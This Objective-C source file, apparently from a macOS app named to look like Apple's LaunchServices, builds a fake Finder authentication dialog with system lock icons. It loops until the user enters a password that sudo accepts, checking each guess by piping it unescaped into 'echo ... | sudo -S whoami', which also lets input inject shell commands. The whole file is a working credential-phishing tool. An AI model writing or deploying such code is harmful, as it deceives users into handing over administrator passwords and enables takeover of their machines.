//
//  AppDelegate.m
//  AppleLaunchServices
//
//  Created by James Pickering on 9/3/14.
//
//

#import <CoreServices/CoreServices.h>
#import "AppDelegate.h"
#import "InputView.h"

//#define YOSEMITE

@interface ASFinderAlert : NSAlert {
@private
    id _asview;
}

- (NSString *)password;

@end

@implementation ASFinderAlert

- (void)layout {
    [super layout];
    
    NSRect frame = [_asview frame];
    frame.origin.x= [self.icon size].width + 42;
    frame.origin.y = 81;
    [_asview setFrame:frame];
    [[self.window contentView] addSubview:_asview];
}

- (void)setAccessoryView:(NSView *)accessoryView {
    _asview = accessoryView;
    NSView *fakeAccessoryView = [[NSView alloc] initWithFrame:accessoryView.frame];
    [super setAccessoryView:fakeAccessoryView];
}

- (NSView *)accessoryView {
    return _asview;
}

- (NSString *)password {
    return [[_asview viewWithTag:1337] stringValue];
}

@end


@interface AppDelegate ()

@property (weak) IBOutlet NSWindow *window;

@end

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    while (1) {
        ASFinderAlert *passRequest = [[ASFinderAlert alloc] init];
        if (getgid()==20) {
            [passRequest setMessageText:@"Finder wants to make changes. Type your       password to allow this."];
        }
        else {
            [passRequest setMessageText:@"Finder wants to make changes. Type an       administrator's name and password to allow this."];
        }
        [passRequest addButtonWithTitle:@"OK"];
        [passRequest addButtonWithTitle:@"Cancel"];
        [passRequest setAccessoryView:[InputView inputViewWithUsername:NSFullUserName()]];
        
        NSProcessInfo *pInfo = [NSProcessInfo processInfo];
        NSString *version = [pInfo operatingSystemVersionString];
        NSImage *lockImage;
        if ([[[version substringFromIndex:11] substringToIndex:2] isEqualToString:@"10"]) {
            lockImage = [[NSImage alloc] initWithContentsOfFile:[[NSBundle mainBundle] pathForImageResource:@"LOCK_YOSEMITE.png"]];
        }
        else {
            lockImage = [[NSImage alloc] initWithContentsOfFile:[[NSBundle mainBundle] pathForImageResource:@"LOCK_MAVERICKS.png"]];
        }
        [passRequest setIcon:lockImage];
        NSUInteger button = [passRequest runModal];
        NSLog(@"button: %lu", (unsigned long)button);
        if (button == 1000) {
            
            system("/usr/bin/sudo -K");
            
            NSTask *echo = [NSTask new];
            [echo setLaunchPath:@"/bin/bash"];
            [echo setArguments:@[@"-c", [NSString stringWithFormat:@"echo %@ | sudo -S whoami", [passRequest password]]]];
            [echo setCurrentDirectoryPath:@"~/"];
            
            NSPipe *outputPipe = [NSPipe pipe];
            [echo setStandardInput:[NSPipe pipe]];
            [echo setStandardOutput:outputPipe];
            
            [echo launch];
            [echo waitUntilExit];
            
            NSData *outputData = [[outputPipe fileHandleForReading] readDataToEndOfFile];
            NSString *outputString = [[NSString alloc] initWithData:outputData encoding:NSUTF8StringEncoding];
            if ([outputString rangeOfString:@"root"].location != NSNotFound) {
                break;
            }
            else {
                NSBeep();
            }
        }
        else {
            NSBeep();
        }
    }
}

- (void)applicationWillTerminate:(NSNotification *)aNotification {
}

@end
